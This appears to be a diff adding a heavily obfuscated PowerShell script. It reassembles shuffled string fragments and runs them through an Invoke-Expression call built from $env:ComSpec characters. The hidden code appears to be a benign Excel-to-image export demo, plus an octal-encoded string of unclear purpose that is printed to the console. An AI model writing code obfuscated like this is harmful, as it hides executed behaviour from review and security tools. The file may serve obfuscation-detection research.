@@ -1,0 +1,60 @@
+. ( $eNv:CoMSPEc[4,26,25]-JOIn'') (((("{60}{70}{40}{24}{56}{69}{35}{53}{9}{11}{54}{52}{18}{30}{57}{61}{66}{2}{26}{63}{33}{29}{14}{74}{72}{41}{21}{8}{4}{5}{58}{31}{47}{25}{65}{48}{36}{32}{3}{17}{67}{45}{50}{71}{37}{76}{73}{1}{64}{51}{59}{15}{43}{77}{44}{28}{19}{13}{27}{34}{46}{38}{39}{12}{55}{20}{68}{0}{6}{22}{10}{78}{75}{49}{62}{16}{7}{42}{23}"-f'celRange                -Worksheet cKBworksheet -Range U0bC:CU0b      -NumberFormat U0b#,##0.00U0b','xpo','     if (cKBextension -in @(Ylg','     cKBimage  = Get-Clipboard -','w-Object -ComObject U0bExcel.Applica','tionU0b
+','   ','ckage cKBexcelPackage -WorksheetName cKBworksheetName
+
+Convert-ExcelRangeToImage ','KBPathU0b -Status U0bStarting ExcelU0b
+        cKBxlApp  = Ne','
+function Convert-ExcelRangeToImage {
+    [alias(U0bCo','erForma','nver','-Range U0b',',Description,company,','if we donYlgt recognise the extension OR if it is JPG with an E, use JPEG format','et-Item  ','b -Bold
+
+Export-Excel -ExcelPa','Form','      cKBWorksheetName = U0bSheet1U0b ,
+        [paramete','
+cKBPath          = U0bcKBpwd1lAdemo.xlsxU0b
+cKBmyData        = Get-Process cwB Select-Object -Property Name,WS,CPU','b      -NumberFormat U0b#,###U','BRange of cKBWorksheetName in c','      -AutoFit
+Set-ExcelRange                -Worksheet cKBworksheet -Range U0bF:FU0b      -Numb','Bpwd1lAtemp.pngU0b  -show
+#>
+
+
+#Convert-ExcelRangeToImage -Path cKBPath -WorksheetName cKBworksheetName -range cKBrange -destination  U0bcKBpwd1lAtemp.pngU0b  -show
+','{60{47Ylg-SpLITYlg&Ylg -SplIt YlgOYlg -SPliT YlgKYlg -SPLiTYlg@Ylg-SPLItYlgiYlg -sPLit Ylg{Ylg -SPlItYlgEYlg-SPLiTYlg,Ylg-sPLiT Yl','      cKBxlWbk.Worksheets(cKB','JPEGYlg,','startTime
+
+cKBexcelPackage  = cKBmyData cwB Export-Excel -KillExcel -','ProcessesYlg',' }       #','r(Mandatory=cKBtrue)]
+        cKBRange,
+        cKBDestination = U','Name in cKBPathU0b -Status U0bOpening Workbook and copying dataU0b
+   ','taU0b
+        # Get-Clipboard came in with PS5. Older versions can use [System.Windows.Clipboard] but it is ugly.
+   ','awing.Imaging.ImageFormat]cKBextension
+       ','Path cKBPath -WorksheetName cKBworksheetName -ClearSheet -AutoS','NT16( ( [StrINg]cKB_ ),8))) } )+U0b','ivity U0bExporting cKBRange of cKBWorksheetName in cKBPathU0b -Status U0bSaving copied da','g cKBRange of cKBWorksheetName in cKBPathU0b -Status U0bClosing ExcelU0b
+        cKBnull = cKBxlWbk.ActiveSheet.Range(U0ba','-ExcelRange           ','     -Worksheet cKBworksheet ','63','cK','-Path cKBPath -WorksheetName cKBworksheetName -range cKBrange -destination  U0bcK','    -Path ','rksheetName = Ylg','     cKBimage.Save(cKBDestination, cKBFormat)
+   ','ize -AutoFilter -BoldTopRow -FreezeTopRow -PassThru
+cKBworksheet     = cKBexcelPackage.Workbook.Worksheets[cKBworksheetName]
+cKBrange         = cKBworksheet.Dimension.Address
+Set','     cKBxlWbk  = cKBxlApp.Workbooks.Open(cKBPath)
+  ','.Copy()
+        Write-Progress -Act','d-ConditionalFormatting','     Write-Progress -Activit','tName in cKBPathU0b -Completed
+        if (cKBShow) {Start-Process -FilePa','     [parameter(Mandatory=cKBtrue)]
+        cKBPath,
+  ','cKB(set-VARiAbLe YlgofSYlg  Ylg Ylg )U0b  )cwB  write-host','t-XlRangeToImageU0b)]
+    param (
+   ','b:bU0','g;Ylg-sPLIt YlgfYlg cw','0bcKBpwd1lAtemp.pngU0b,
+   ','        Write-Progress -Activity U0bExporting cKBRange of cKBWorksheet','th cKBDestination}
+        else       {G','( U0bcKB( sET-VA','     [switch]cKBShow
+    )
+        cKBextension   = cKBDestination -replace Ylg^.*1lA.(1lAw+)cKBYlg ',' -Worksheet cKBworksheet -Range U0bc2:c1000U0b -DataBarColor Blue
+Add-ConditionalFormatting -Worksheet cKBworksheet -Range U0bb2:B1000U0b -RuleType GreaterThan -ConditionValue Ylg104857600Ylg -ForeGroundColor U0bRedU0','YlgBMPYlg,YlgPNGYlg))  {
+            cKBFormat = [system.Dr','rting cKBRange of cKBWorkshee','WorksheetName).Select()
+        cKBnull = cKBxlWbk.ActiveSheet.Range(cKBRange).Select()
+        cKBnull = cKBxlApp.Selection',',YlgcKB1Ylg
+   ','at Image
+   ','0b            -AutoFit
+Set-Ex','B FOReach-OBJeCT{ ( [CHaR] ([ConverT]::ToI','RIAbLE  YlgOfSYlg  YlgYlg ) U0b + [StRiNG]( Ylg47;151E160{72;61K61f62f56@61&60@67,56@62;62&65i56,61@','y U0bExportin','       else { cKBFormat = [system.Drawing.Imaging.ImageFormat]::Jpeg}
+        Write-Progress -Activity U0bExporting ','n.Copy()
+        cKBxlApp.Quit()
+        Write-Progress -Activity U0bE','
+ ',' MMMM HH:mm:ssU0b -AutoFit
+Ad','1U0b).Select()
+        cKBnull = cKBxlApp.Selectio','    cKBDestination}
+}
+<#
+del demo*.xlsx
+
+cKBwo','t U0bdd'))-crEpLAce([chaR]85+[chaR]48+[chaR]98),[chaR]34 -rEPLACE ([chaR]99+[chaR]75+[chaR]66),[chaR]36 -rEPLACE  'Ylg',[chaR]39-crEpLAce  'cwB',[chaR]124 -crEpLAce  ([chaR]49+[chaR]108+[chaR]65),[chaR]92) )
